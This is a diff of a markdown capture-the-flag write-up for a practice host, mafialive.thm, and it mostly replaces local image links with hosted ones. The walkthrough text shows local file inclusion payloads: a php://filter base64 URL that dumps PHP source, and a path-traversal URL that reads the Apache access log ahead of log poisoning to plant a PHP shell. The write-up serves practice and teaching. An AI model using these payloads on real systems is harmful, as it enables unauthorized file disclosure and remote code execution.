@@ -59,25 +59,25 @@ We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate 
 
 Let's try a php filter to exfiltrate data:
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
-![](Now we have the phrase "Control is an illusion" written in base64.
+![](https://github.com/user-attachments/assets/e75944cf-5cdb-4f47-a885-cd450a3b8f94)Now we have the phrase "Control is an illusion" written in base64.
 
 
 
 
 Let's do it with the entire test.php page:
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
-![[Pasted image 20251031110303.png]]
+![(https://github.com/user-attachments/assets/610df6ee-0757-4ce7-944c-fcbc48672fb8)
 
 
 
 And decode the exfiltrated data to find the second flag:
-![[Pasted image 20251031110541.png]]
+![](https://github.com/user-attachments/assets/87172f7a-2aab-49ed-8ee8-7f06a6616acd)
 
 
 
 Now, given the LFI vulnerability, if we can successfully access the log, we can poison it (log poisoning) to insert our php shell:
 `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log`
-![[Pasted image 20251031174631.png]]
+![](https://github.com/user-attachments/assets/729eeef7-165f-4afe-94bd-ca6533cbd20b)
 
 
 
